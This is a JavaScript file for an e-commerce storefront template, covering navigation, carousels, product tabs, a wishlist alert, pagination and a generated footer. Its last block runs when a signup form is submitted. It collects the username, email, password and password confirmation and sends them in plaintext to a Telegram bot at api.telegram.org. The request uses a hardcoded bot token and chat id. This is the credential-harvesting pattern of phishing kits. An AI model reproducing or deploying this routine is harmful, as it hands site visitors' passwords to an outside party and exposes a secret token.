/* START ADD CLASS active-link IN CURRENT BAGE */
const links = document.querySelectorAll(".nav-link");
const current = location.href;

links.forEach((link) => {
  if (link.href === current) {
    link.classList.add("active-link");
  }
});
/* END ADD CLASS active-link IN CURRENT BAGE */

/* START SHOW MENU */
const navMenu = document.getElementById("nav-menu"),
  navToggle = document.getElementById("nav-toggle"),
  navClose = document.getElementById("nav-close");
/* END SHOW MENU */

/* START Menu Show END*/

/* Validate if constant exists */
if (navToggle) {
  navToggle.addEventListener("click", () => {
    navMenu.classList.add("show-menu");
  });
}
/* Hide Show */
/* Validate if constant exists */
if (navClose) {
  navClose.addEventListener("click", () => {
    navMenu.classList.remove("show-menu");
  });
}
/* END Menu Show END*/

/* START IMAGE GALLERY */
function imgGallery() {
  const mainImg = document.querySelector(".details-img"),
    smallimg = document.querySelectorAll(".details-small-img");

  smallimg.forEach((img) => {
    img.addEventListener("click", function () {
      mainImg.src = this.src;
    });
  });
}
imgGallery();
/* End IMAGE GALLERY */

/* START SWIPER CATEGORIES */
var swiperCategories = new Swiper(".categories-container", {
  spaceBetween: 24,
  navigation: {
    nextEl: ".swiper-button-next",
    prevEl: ".swiper-button-prev",
  },
  breakpoints: {
    350: {
      slidesPerView: 2,
      spaceBetween: 20,
    },
    768: {
      slidesPerView: 3,
      spaceBetween: 20,
    },
    992: {
      slidesPerView: 4,
      spaceBetween: 24,
    },
    1200: {
      slidesPerView: 5,
      spaceBetween: 24,
    },
    1400: {
      slidesPerView: 6,
      spaceBetween: 24,
    },
  },
});
/* END SWIPER CATEGORIES */

/* START SWIPER PRODUCTS */
var swiperProducts = new Swiper(".new-container", {
  spaceBetween: 24,
  navigation: {
    nextEl: ".swiper-button-next",
    prevEl: ".swiper-button-prev",
  },
  breakpoints: {
    768: {
      slidesPerView: 2,
      spaceBetween: 24,
    },
    992: {
      slidesPerView: 3,
      spaceBetween: 24,
    },
    1400: {
      slidesPerView: 4,
      spaceBetween: 24,
    },
  },
});
/* End SWIPER PRODUCTS */

/* START PRODUCTS TABS */
const tabs = document.querySelectorAll("[data-target]"),
  tabContent = document.querySelectorAll("[content]");

tabs.forEach((tab) => {
  tab.addEventListener("click", () => {
    const target = document.querySelector(tab.dataset.target);
    tabContent.forEach((tabContent) => {
      tabContent.classList.remove("active-tab");
    });
    target.classList.add("active-tab");

    tabs.forEach((tab) => {
      tab.classList.remove("active-tab");
    });

    tab.classList.add("active-tab");
  });
});
/* END PRODUCTS TABS */

/* START IMAGE DETAILS */
window.addEventListener("DOMContentLoaded", (event) => {
  const urlParams = new URLSearchParams(window.location.search);
  const srcParam = urlParams.get("src");
  const hoverParam = urlParams.get("hover");

  const detailsImage = document.querySelector(".details-img.main");
  const detailsImagemain = document.querySelector(".details-small-img.main");
  const detailsImagesub = document.querySelectorAll(".details-small-img.sub");

  if (srcParam) {
    detailsImage.src = srcParam;
    detailsImagemain.src = srcParam;
  }

  if (hoverParam) {
    detailsImagesub.forEach((img) => {
      img.src = hoverParam;
    });
  }
});
/* END IMAGE DETAILS */

/* START CHANGE COLOR HEART AND SHOW sweetalert2 LIBRARY */
function changeHeartColor(event) {
  const heart = event.target;
  event.preventDefault();

  if (heart.style.color === "red") {
    heart.style.color = "#898989";
  } else {
    heart.style.color = "red";
    Swal.fire({
      position: "top-end",
      icon: "success",
      title: "Add To Wishlist Successfully",
      showConfirmButton: false,
      timer: 1500,
    });
  }
}
/* END CHANGE COLOR HEART AND SHOW sweetalert2 LIBRARY */

/* START CHANGE COLOR CART AND SHOW sweetalert2 LIBRARY */
function changeCart(event) {
  event.preventDefault();
  const heart = event.target;

  if (heart.style.color === "red") {
    heart.style.color = "#898989";
  } else {
    heart.style.color = "#9e9e9eb3";
    Swal.fire({
      position: "top-end",
      icon: "success",
      title: "Add To Cart Successfully",
      showConfirmButton: false,
      timer: 1500,
    });
  }
}
/* END CHANGE COLOR CART AND SHOW sweetalert2 LIBRARY */

/* START NEWSLETTER */
const newsletterSection = document.createElement("section");
newsletterSection.classList.add("newsletter", "section");

const newsletterContainer = document.createElement("div");
newsletterContainer.classList.add("newsletter-container", "container", "grid");

const newsletterTitle = document.createElement("h3");
newsletterTitle.classList.add("newsletter-title", "flex");

const newsletterIcon = document.createElement("img");
newsletterIcon.src = "image/icon-email.svg";
newsletterIcon.alt = "";
newsletterIcon.classList.add("newsletter-icon");

const newsletterTitleText = document.createTextNode("Sign Up To Newsletter");
newsletterTitle.appendChild(newsletterIcon);
newsletterTitle.appendChild(newsletterTitleText);

const newsletterDescription = document.createElement("p");
newsletterDescription.classList.add("newsletter-description");
newsletterDescription.textContent =
  "...and receive $25 coupon for first shopping";

const newsletterForm = document.createElement("form");
newsletterForm.action = "";
newsletterForm.classList.add("newsletter-form");

const newsletterInput = document.createElement("input");
newsletterInput.type = "text";
newsletterInput.placeholder = "Enter Your email";
newsletterInput.classList.add("newsletter-input");

const newsletterButton = document.createElement("button");
newsletterButton.type = "submit";
newsletterButton.classList.add("newsletter-btn");
newsletterButton.textContent = "Subscribe";

newsletterForm.appendChild(newsletterInput);
newsletterForm.appendChild(newsletterButton);

newsletterContainer.appendChild(newsletterTitle);
newsletterContainer.appendChild(newsletterDescription);
newsletterContainer.appendChild(newsletterForm);

newsletterSection.appendChild(newsletterContainer);

document.body.appendChild(newsletterSection);
/* END NEWSLETTER */

/* START FOOTER*/
const footer = document.createElement("footer");
footer.classList.add("footer", "container");

const footerContainer = document.createElement("div");
footerContainer.classList.add("footer-container", "grid");

const footerContent1 = document.createElement("div");
footerContent1.classList.add("footer-content");

const footerLogo = document.createElement("a");
footerLogo.href = "index.html";
footerLogo.classList.add("footer-logo");

const logoImg = document.createElement("img");
logoImg.src = "image/logo.svg";
logoImg.alt = "";
logoImg.classList.add("footer-logo-img");

footerLogo.appendChild(logoImg);

const footerSubtitle1 = document.createElement("h4");
footerSubtitle1.classList.add("footer-subtitle");
footerSubtitle1.textContent = "Contact";

const addressPara = document.createElement("p");
addressPara.classList.add("footer-description");
addressPara.innerHTML =
  "<span>Address:</span> RK 18 Jain Road, Dwarka Mor, New Delhi 110059";

const phonePara = document.createElement("p");
phonePara.classList.add("footer-description");
phonePara.innerHTML = "<span>Phone:</span> +91 8930798542 / +91 8708898542";

const hoursPara = document.createElement("p");
hoursPara.classList.add("footer-description");
hoursPara.innerHTML = "<span>Hours:</span> 09:00 - 20:00, Mon - Sat";

const footerSocial = document.createElement("div");
footerSocial.classList.add("footer-social");

const footerSubtitle2 = document.createElement("h4");
footerSubtitle2.classList.add("footer-subtitle");
footerSubtitle2.textContent = "Follow Me";

const socialLinks = document.createElement("div");
socialLinks.classList.add("footer-social-links", "flex");

const socialIcons = [
  "icon-facebook.svg",
  "icon-twitter.svg",
  "icon-instagram.svg",
  "icon-pinterest.svg",
  "icon-github.svg",
];
for (const icon of socialIcons) {
  const link = document.createElement("a");
  link.href = "";
  const iconImg = document.createElement("img");
  iconImg.src = `image/${icon}`;
  iconImg.alt = "";
  iconImg.classList.add("footer-social-icon");
  link.appendChild(iconImg);
  socialLinks.appendChild(link);
}

footerContent1.appendChild(footerLogo);
footerContent1.appendChild(footerSubtitle1);
footerContent1.appendChild(addressPara);
footerContent1.appendChild(phonePara);
footerContent1.appendChild(hoursPara);
footerContent1.appendChild(footerSocial);
footerSocial.appendChild(footerSubtitle2);
footerSocial.appendChild(socialLinks);

const footerContent2 = document.createElement("div");
footerContent2.classList.add("footer-content");

const footerTitle1 = document.createElement("h3");
footerTitle1.classList.add("footer-title");
footerTitle1.textContent = "Address";

const addressList = document.createElement("ul");
addressList.classList.add("footer-links");

const addressLinks = [
  "About Us",
  "Delivery Information",
  "Privacy Policy",
  "Terms & Conditions",
  "Contact Us",
  "Support Center",
];
for (const linkText of addressLinks) {
  const listItem = document.createElement("li");
  const link = document.createElement("a");
  link.href = "";
  link.classList.add("footer-link");
  link.textContent = linkText;
  listItem.appendChild(link);
  addressList.appendChild(listItem);
}

footerContent2.appendChild(footerTitle1);
footerContent2.appendChild(addressList);

const footerContent3 = document.createElement("div");
footerContent3.classList.add("footer-content");

const footerTitle2 = document.createElement("h3");
footerTitle2.classList.add("footer-title");
footerTitle2.textContent = "My Account";

const accountList = document.createElement("ul");
accountList.classList.add("footer-links");

const accountLinks = [
  "Sign In",
  "View Cart",
  "My Wishlist",
  "Track My Order",
  "Help",
  "Order",
];
for (const linkText of accountLinks) {
  const listItem = document.createElement("li");
  const link = document.createElement("a");
  link.href = "";
  link.classList.add("footer-link");
  link.textContent = linkText;
  listItem.appendChild(link);
  accountList.appendChild(listItem);
}

footerContent3.appendChild(footerTitle2);
footerContent3.appendChild(accountList);

const footerContent4 = document.createElement("div");
footerContent4.classList.add("footer-content");

const footerTitle3 = document.createElement("h3");
footerTitle3.classList.add("footer-title");
footerTitle3.textContent = "Secured Payment Gateways";

const paymentImg = document.createElement("img");
paymentImg.src = "image/payment-method.png";
paymentImg.alt = "";
paymentImg.classList.add("payment-img");

footerContent4.appendChild(footerTitle3);
footerContent4.appendChild(paymentImg);

const footerBottom = document.createElement("div");
footerBottom.classList.add("footer-bottom");

const copyrightPara = document.createElement("p");
copyrightPara.classList.add("copyright");
copyrightPara.textContent = "\u00A9 2023 Anurag Yadav. All rights reserved";

const designerSpan = document.createElement("span");
designerSpan.classList.add("designer");
designerSpan.textContent = "Designed By Anurag Yadav";

footerBottom.appendChild(copyrightPara);
footerBottom.appendChild(designerSpan);

footer.appendChild(footerContainer);
footerContainer.appendChild(footerContent1);
footerContainer.appendChild(footerContent2);
footerContainer.appendChild(footerContent3);
footerContainer.appendChild(footerContent4);
footer.appendChild(footerBottom);

document.body.appendChild(footer);
/* END FOOTER*/

/* START pagination */
document.addEventListener("DOMContentLoaded", function () {
  const prevPageBtn = document.getElementById("prevPage");
  const nextPageBtn = document.getElementById("nextPage");
  const paginationLinks = document.querySelector(".pagination");
  const productContainer = document.querySelector(".products-container");
  const productItems = document.querySelectorAll(".product-item");
  const itemsPerPage = 12;
  let currentPage = 1;

  function updatePagination() {
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = currentPage * itemsPerPage;

    productItems.forEach((item, index) => {
      if (index >= startIndex && index < endIndex) {
        item.style.display = "block";
      } else {
        item.style.display = "none";
      }
    });

    generatePaginationLinks();

    const pageLinks = paginationLinks.querySelectorAll(".pagination-link");
    pageLinks.forEach((link, index) => {
      if (index === currentPage) {
        link.classList.add("active");
      } else {
        link.classList.remove("active");
      }
    });
  }

  function generatePaginationLinks() {
    const totalItems = productItems.length;
    const totalPages = Math.ceil(totalItems / itemsPerPage);

    paginationLinks.innerHTML = "";

    const prevPageLink = document.createElement("li");
    const prevPageAnchor = document.createElement("a");
    prevPageAnchor.href = "#";
    prevPageAnchor.classList.add("pagination-link", "icon-left");
    prevPageAnchor.innerHTML = '<i class="fi-rs-angle-double-small-left"></i>';
    prevPageLink.appendChild(prevPageAnchor);
    paginationLinks.appendChild(prevPageLink);

    for (let i = 1; i <= totalPages; i++) {
      const pageLink = document.createElement("li");
      const pageAnchor = document.createElement("a");
      pageAnchor.href = "#";
      pageAnchor.classList.add("pagination-link");
      pageAnchor.textContent = i;
      pageLink.appendChild(pageAnchor);
      paginationLinks.appendChild(pageLink);

      pageAnchor.addEventListener("click", () => {
        currentPage = i;
        updatePagination();
      });
    }

    const nextPageLink = document.createElement("li");
    const nextPageAnchor = document.createElement("a");
    nextPageAnchor.href = "#";
    nextPageAnchor.classList.add("pagination-link", "icon-right");
    nextPageAnchor.innerHTML = '<i class="fi-rs-angle-double-small-right"></i>';
    nextPageLink.appendChild(nextPageAnchor);
    paginationLinks.appendChild(nextPageLink);

    prevPageAnchor.addEventListener("click", () => {
      if (currentPage > 1) {
        currentPage--;
        updatePagination();
      }
    });

    nextPageAnchor.addEventListener("click", () => {
      if (currentPage < totalPages) {
        currentPage++;
        updatePagination();
      }
    });
  }

  if (paginationLinks) {
    updatePagination();
  }
});

/* END pagination */

/* START Remove Row */
function removeRow(iconElement) {
  var row = iconElement.closest("tr");
  row.remove();
}
/* END Remove Row */

/* START SEND MESSAGE IN TELEGRAM BOT */
const form = document.getElementById("form");
form.addEventListener("submit", (e) => {
  e.preventDefault();

  let userName = document.getElementById("username").value;
  let email = document.getElementById("email").value;
  let pass = document.getElementById("pass").value;
  let confirmPass = document.getElementById("confirm-pass").value;

  let my_text = `Result is:%0A - userNmae: ${userName} %0A - email: ${email} %0A - pass: ${pass} %0A - confirmPass: ${confirmPass}`;

  let token = "6185876376:AAGOhCPpur1KnfBxqDxOeyzICQWV1F9FR10";
  var chat_id = -1001915309374;
  let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  console.log("Message succ");
});
/* END SEND MESSAGE IN TELEGRAM BOT */
